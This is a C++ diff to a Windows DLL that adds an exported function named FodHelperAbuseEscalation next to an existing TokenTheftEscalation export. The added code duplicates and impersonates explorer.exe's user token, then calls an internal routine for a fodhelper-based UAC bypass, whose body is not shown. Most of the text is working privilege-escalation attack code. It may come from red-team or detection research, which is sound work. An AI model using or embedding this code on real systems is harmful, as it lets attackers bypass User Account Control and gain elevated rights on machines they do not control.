@@ -1,8 +1,12 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
 #include "pch.h"
-#include <iostream>
+#include "FodHelperAbuseEscalationUtils.h"
+
+#include <shellapi.h>
 #include <windows.h>
+#include <tlhelp32.h>
 #include <stdio.h>
+#include <wchar.h>
 
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
@@ -102,3 +106,49 @@ extern "C" __declspec(dllexport) int TokenTheftEscalation(DWORD pid) {
     printf("Process created successfully.\n");
     return 0;
 }
+
+extern "C" __declspec(dllexport) int FodHelperAbuseEscalation() {
+
+    Marker();
+
+    DWORD explorerPid = FindExplorerPidInMySession();
+    if (!explorerPid) { printf("No explorer.exe found.\n"); return 1; }
+
+    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, explorerPid);
+    if (!hProc) { printf("OpenProcess failed: %lu\n", GetLastError()); return 1; }
+
+    HANDLE hTok = NULL;
+    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hTok))
+    {
+        printf("OpenProcessToken failed: %lu\n", GetLastError());
+        CloseHandle(hProc);
+        return 1;
+    }
+    CloseHandle(hProc);
+
+    HANDLE hImpersonation = NULL;
+    if (!DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hImpersonation))
+    {
+        printf("DuplicateTokenEx failed: %lu\n", GetLastError());
+        CloseHandle(hTok);
+        return 1;
+    }
+    CloseHandle(hTok);
+
+    if (!ImpersonateLoggedOnUser(hImpersonation))
+    {
+        printf("ImpersonateLoggedOnUser failed: %lu\n", GetLastError());
+        CloseHandle(hImpersonation);
+        return 1;
+    }
+
+    Marker();
+
+    FodHelperAbuseEscalationInternal();
+
+    RevertToSelf();
+    CloseHandle(hImpersonation);
+    return 0;
+}
+
+
